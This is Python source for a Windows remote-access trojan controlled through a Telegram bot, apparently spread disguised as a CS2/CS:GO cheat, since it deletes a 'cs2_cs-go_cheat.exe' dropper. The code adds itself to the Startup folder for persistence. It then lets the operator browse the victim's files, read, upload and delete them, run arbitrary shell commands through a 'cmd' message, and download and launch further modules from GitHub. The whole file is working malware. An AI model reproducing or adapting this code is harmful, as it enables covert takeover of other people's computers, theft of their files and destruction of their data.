"""
def getDownloadPath():
    path=os.getcwd()
    path=path.split('\\')
    t=path.index('Users')+1
    path=path[:t+1]
    path.append('Downloads')
    path.append('python-3.12.1-amd64.exe')
    path='\\'.join(path)
    return path
"""
def formatList(l,sep):
    return sep.join(l)
def downloadAndSetupMod(urlGit,name):
    global nameMods
    global modules
    if not os.path.isdir(f"C:\\winTest\\{name}"):
        installed=[]
        noInstalled=[]
        os.mkdir(f"C:\\winTest\\{name}")
        try:
            response = requests.get(urlGit)
        except:
            return "noReposytory"
        zip_data = response.content
        with open(f"C:\\winTest\\{name}\\archive.zip", 'wb') as file:
            file.write(zip_data)
        with ZipFile(f"C:\\winTest\\{name}\\archive.zip", 'r') as zip_ref:
            zip_ref.extractall(f"C:\\winTest\\{name}")
        os.remove(f"C:\\winTest\\{name}\\archive.zip")
        dirSetupName=os.listdir(f"C:\\winTest\\{name}")[0]
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\{name}{'.py'}",f"C:\\winTest\\{name}\\{name}{'.pyw'}")
        shutil.move(f"C:\\winTest\\{name}\\{dirSetupName}\\data",f"C:\\winTest\\{name}")
        shutil.rmtree(f"C:\\winTest\\{name}\\{dirSetupName}")
        print(dirSetupName)
        with open(f"C:\\winTest\\{name}\\data\\modules.txt") as file:
            for line in file:
                modules.append(line.rstrip('\n'))
        for i in modules:
            if int(os.system(f"pip3 install {i}"))==0:
                installed.append(i)
            else:
                noInstalled.append(i)
        modules=list(set(modules))
        with open("C:\\winTest\\modules.txt","w") as file:
            for i in modules:
                file.write(i+'\n')
        with open("C:\\winTest\\mods.txt") as file:
            mods1=file.read().rstrip().split(' ')
        mods1.append(f"{urlGit}#{name}")
        with open("C:\\winTest\\mods.txt","w") as file:
            file.write(' '.join(mods1))
        nameMods.append(name)
        print(nameMods)
        return installed,noInstalled
    else:
        return "module installed"
def deletaEXE():
    with open("C:\\winTest\\dir.txt") as file:
        x=file.read().rstrip('\n').split('\\')[:-1]
    x1=x.copy()
    x.append('cs2_cs-go_cheat.exe')
    x1.append('python-3.12.1-amd64.exe')
    y='\\'.join(x)
    y1 = '\\'.join(x1)
    os.system(f"del {y}")
    os.system(f"del {y1}")
def startModule(dirName,fileName):
    global processes
    xx=subprocess.Popen(['python',f"C:\\winTest\\{dirName}\\{fileName}.pyw"])
    processes[dirName]=xx
def stopModule(name):
    global processes
    processes[name].terminate()
    del processes[name]
def run_command(cmd):
    result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    b = bytes(result.stdout+result.stderr, "cp1251")
    s = str(b, "cp866")
    return s



import subprocess,time,os,shutil
os.system("pip3 install requests")
os.system("pip3 install pyTelegramBotAPI")
import requests,telebot
from telebot import types
from zipfile import ZipFile
deletaEXE()
with open("C:\\winTest\\dir.txt") as file:
    x = file.read().rstrip('\n').split('\\')[:-2]
x.append("AppData")
x.append("Roaming")
x.append("Microsoft")
x.append("Windows")
x.append("Start Menu")
x.append("Programs")
x.append("Startup")
x.append("autoStartWin.bat")
x='\\'.join(x)
if not os.path.isfile(x):
    with open(x,"w+") as bat_file:
        bat_file.write(r'start "" %s' % "C:\\winTest\\winStart.pyw")

if not os.path.isdir(f"C:\\winTest"):
    os.mkdir(f"C:\\winTest")
if not os.path.isfile("C:\\winTest\\modules.txt"):
    with open("C:\\winTest\\modules.txt","a"):
        pass
if not os.path.isfile("C:\\winTest\\mods.txt"):
    with open("C:\\winTest\\mods.txt","a"):
        pass
mods=[]
nameMods=[]
modules=[]
processes={}
pn=["C:"]
with open("C:\\winTest\\mods.txt") as file:
    mods=file.read().rstrip('\n').lstrip().split(' ')
    print(mods)
with open("C:\\winTest\\modules.txt") as file:
    modules=file.read().rstrip('\n').split(' ')
for i in mods:
    try:
        url,n1=i.split('#')
        print(downloadAndSetupMod(url, n1))
        nameMods.append(n1)
    except ValueError:
        nameMods=[]
        print("exept")
print(nameMods)
for i in modules:
    os.system(f"pip3 install {i}")
with open("C:\\winTest\\dir1.txt") as file:
    token=file.read()
bot = telebot.TeleBot(token)
print(nameMods)
@bot.message_handler(commands="start")
def keyb(message):
    markup=types.ReplyKeyboardMarkup()
    bt1=types.KeyboardButton("/root",)
    bt2=types.KeyboardButton("/dirs")
    bt3=types.KeyboardButton("/open")
    bt4=types.KeyboardButton("/delete")
    bt5 = types.KeyboardButton("/pwd")
    bt6 = types.KeyboardButton("/get")
    bt7 = types.KeyboardButton("/..")
    markup.row(bt1,bt2,bt3)
    markup.row(bt4, bt5, bt6)
    markup.row(bt7)
    bot.send_message(message.chat.id,"Hello",reply_markup=markup)
@bot.message_handler(commands="dirs")
def dirs(message):
    try:
        print("sdf")
        xz="\\".join(pn)+"\\"
        print(xz)
        ps=os.listdir(xz)
        print(ps)
        markup=types.InlineKeyboardMarkup()
        for i in ps:
            if not ("NTUSER.DAT" in i or len(i)>25):
                print(i)
    #            bot.send_message(message.chat.id,i)
                markup.add(types.InlineKeyboardButton(i,callback_data="pathurl#"+i))
        markup.add(types.InlineKeyboardButton("..",callback_data=".."))
        bot.send_message(message.chat.id,"Список директорий",reply_markup=markup)
    except:
        bot.send_message(message.chat.id, "Ошибка пути")
@bot.callback_query_handler(func=lambda callback:True)
def calldata(callback):
    global pn
    if "pathurl" in callback.data:
        teg,pth=callback.data.split("#")
        pn.append(pth)
        bot.delete_message(callback.message.chat.id,callback.message.message_id)
        print(pn)
    elif callback.data=="..":
        pn=pn[:-1]
        bot.delete_message(callback.message.chat.id, callback.message.message_id)
@bot.message_handler(commands="pwd")
def pwd(message):
    bot.delete_message(message.chat.id,message.message_id)
    bot.send_message(message.chat.id,"\\".join(pn))
@bot.message_handler(commands="delete")
def delete(message):
    xz="\\".join(pn)
    try:
        os.remove(xz)
        bot.send_message(message.chat.id, "Удаление было произведено успешно")
    except Exception as e:
        bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="read")
def delete(message):
    xz="\\".join(pn)
    try:
        with open(xz) as file:
            ress=file.read()
        bot.send_message(message.chat.id,ress)
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="get")
def getFile(message):
    xz="\\".join(pn)
    try:
        with open(xz,"rb") as file:
            ress=file.read()
        bot.send_document(message.chat.id,ress)
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="root")
def root(message):
    global pn
    pn=["C:"]
@bot.message_handler(commands="open")
def openF(message):
    xz="\\".join(pn)
    try:
        with open(xz) as file:
            ress=file.read()
        bot.send_message(message.chat.id,ress)
    except Exception as e:
        bot.send_message(message.chat.id, "При прочтении произошла ошибка, возможно это связанно с некоректным путём")
        bot.send_message(message.chat.id, e)
@bot.message_handler(commands="..")
def back(message):
    global pn
    if len(pn)>1:
        pn=pn[:-1]
    dirs(message)
@bot.message_handler()
def message(message):
    x=message.text.split('#')
    if x[0]=='test':
        bot.send_message(message.chat.id,"Связь в норме")
        print("test")
    elif x[0]=='module':
        print(nameMods)
        if x[1] in nameMods:
            if x[2]=="start":
                bot.send_message(message.chat.id,f"Модуль {x[1]} был успешно запущен")
                startModule(x[1],x[1])
                print("start")
            elif x[2]=="stop":
                try:
                    stopModule(x[1])
                    bot.send_message(message.chat.id, f"Модуль {x[1]} был успешно отключен")
                except:
                    bot.send_message(message.chat.id, f"Модуль {x[1]} не может быть успешно отключен потому, что произошла ошибка или он уже отключен")
                print("stop")
            else:
                bot.send_message(message.chat.id, f"Неправильный параметр {x[2]}")
                print("err")
                print("err2")
        else:
            bot.send_message(message.chat.id,f"Мод {x[1]} не установлен")
    elif x[0]=='setup':
        try:
            res1=downloadAndSetupMod(str(x[1]),str(x[2]))
            if res1=="noReposytory":
                bot.send_message(message.chat.id,f"Url {x[1]} не действителен")
            elif res1=="module installed":
                bot.send_message(message.chat.id,f"Мода {x[1]} уже инсталирован")
            else:
                bot.send_message(message.chat.id,f"{formatList(res1[0],', ')} были установлены")
                bot.send_message(message.chat.id, f"{formatList(res1[1],', ')} были неустановлены")
        except Exception as e:
            bot.send_message(message.chat.id,"При установке мода произошла ошибка")
            bot.send_message(message.chat.id, e)
            bot.send_message(message.chat.id, x[1]+' '+x[2])
            bot.send_message(message.chat.id,f"Список установленных модов {nameMods}")
    elif x[0]=="dirs":
        try:
            bot.send_message(message.chat.id,formatList(os.listdir(x[1]),'  '))
            print(os.listdir(x[1]))
        except Exception as e:
            bot.send_message(message.chat.id,"При получении списка директорий и файлов произошла ошибка, возможно это связанно с некоректным путём")
            bot.send_message(message.chat.id, e)
    elif x[0]=="del":
        try:
            os.remove(x[1])
            bot.send_message(message.chat.id,"Удаление было произведено успешно")
        except Exception as e:
            bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём")
            bot.send_message(message.chat.id, e)
    elif x[0]=="create":
        try:
            with open(x[1],"a") as file:
                pass
            bot.send_message(message.chat.id,"Создание было произведено успешно")
        except Exception as e:
            bot.send_message(message.chat.id, "При удалении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="edit":
        try:
            with open(x[1],x[2]) as file:
                file.write(x[3])
            bot.send_message(message.chat.id,"Редактирование було успешно произведено")
        except Exception as e:
            bot.send_message(message.chat.id,"При удалении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)
    elif x[0]=="read":
        try:
            with open(x[1]) as file:
                res12=file.read()
            bot.send_message(message.chat.id,res12)
        except Exception as e:
            bot.send_message(message.chat.id,"При чтении произошла ошибка, возможно это связанно с некоректным путём или аргументами")
            bot.send_message(message.chat.id, e)

    elif x[0]=="cmd":
        res=run_command(x[1])
        bot.send_message(message.chat.id,res)
    else:
        bot.send_message(message.chat.id, "Ошибка в комманде")
        print("dsfdsfdg")
    print(f"Сообщение получено {x}")
#print(downloadAndSetupMod("https://api.github.com/repos/nick1t0s/localservonflask/zipball","localserver"))
bot.polling(none_stop=True)
# Запуск второго файла в отдельном процессе
#process = subprocess.Popen(['python', 'C:\\winTest\\localServ\\localServ.pyw'])

# ждем некоторое время, прежде чем прервать выполнение
#time.sleep(30)

# Прерывание выполнения второго файла
#process.terminate()


#print(downloadAndSetupMod('https://api.github.com/repos/Nick1t0s/localServOnFlask/zipball','localServ','localServ'))